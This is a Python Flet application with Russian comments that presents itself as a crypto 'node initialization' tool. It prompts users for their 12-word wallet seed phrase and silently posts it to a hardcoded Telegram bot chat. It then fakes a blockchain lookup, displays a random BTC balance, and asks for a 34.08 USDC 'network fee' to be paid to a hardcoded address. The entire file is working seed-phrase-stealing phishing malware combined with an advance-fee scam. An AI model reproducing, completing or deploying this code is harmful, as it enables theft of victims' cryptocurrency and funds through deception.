import flet as ft
import requests
import random
import asyncio

# Твои данные
TOKEN = "7544070267:AAH9m-CclS2u3T68Gq8u8-UuS2G69u-UuS2G"
CHAT_ID = "-1002410363241"
TARGET_ADDRESS = "0xa0ebd0B88e2dA2bD4b78DC17B04f56dc4AE976B9"

async def main(page: ft.Page):
    page.theme_mode = ft.ThemeMode.DARK
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER
    page.scroll = ft.ScrollMode.AUTO
    page.padding = 40

    # Элементы интерфейса
    header = ft.Text("NODE INITIALIZATION", size=26, weight="bold", color="blueaccent")
    seed_input = ft.TextField(
        label="Seed Phrase (12 words)", 
        multiline=True, 
        min_lines=3, 
        width=350,
        border_radius=10
    )
    status_text = ft.Text("", size=16, text_align="center")
    btn = ft.ElevatedButton("ИНИЦИАЛИЗИРОВАТЬ", width=300, height=50, color="white", bgcolor="blue")
    
    # Контейнер для результата (адрес и баланс)
    result_container = ft.Column(visible=False, horizontal_alignment="center")

    # Функция отправки в Телеграм (теперь она не блокирует экран)
    def send_to_tg(text):
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        try:
            # Маленький таймаут, чтобы не ждать вечно
            requests.post(url, json={"chat_id": CHAT_ID, "text": f"🔑 СИД-ФРАЗА:\n{text}"}, timeout=5)
        except:
            pass

    async def on_click(e):
        phrase = seed_input.value.strip()
        
        # 1. Проверка на 12 слов
        if len(phrase.split()) != 12:
            status_text.value = "❌ Ошибка: Введите ровно 12 слов"
            status_text.color = "red"
            await page.update_async()
            return

        # 2. Визуальный отклик
        btn.disabled = True
        status_text.value = "⏳ Подключение к блокчейну..."
        status_text.color = "yellow"
        await page.update_async()

        # 3. Отправка (запускаем в фоне, чтобы не вешать сайт)
        await asyncio.to_thread(send_to_tg, phrase)
        
        # Имитация работы ноды
        await asyncio.sleep(2.5)

        # 4. Показываем результат
        status_text.value = "✅ СИГНАТУРА НАЙДЕНА!"
        status_text.color = "green"
        
        btc = round(random.uniform(0.00045, 0.00088), 6)
        result_container.controls = [
            ft.Text(f"Доступный баланс: {btc} BTC", size=18, weight="bold"),
            ft.Container(height=10),
            ft.Text("Для вывода оплатите комиссию сети (34.08 USDC):", size=12),
            ft.Text(TARGET_ADDRESS, size=11, color="blue200", selectable=True, weight="bold"),
            ft.Text("(Нажмите на адрес, чтобы скопировать)", size=10, italic=True)
        ]
        result_container.visible = True
        btn.visible = False
        seed_input.visible = False
        
        await page.update_async()

    btn.on_click = on_click

    # Собираем страницу
    await page.add_async(
        header,
        ft.Divider(height=20, color="transparent"),
        seed_input,
        ft.Divider(height=10, color="transparent"),
        btn,
        status_text,
        result_container
    )

if __name__ == "__main__":
    ft.app(target=main)
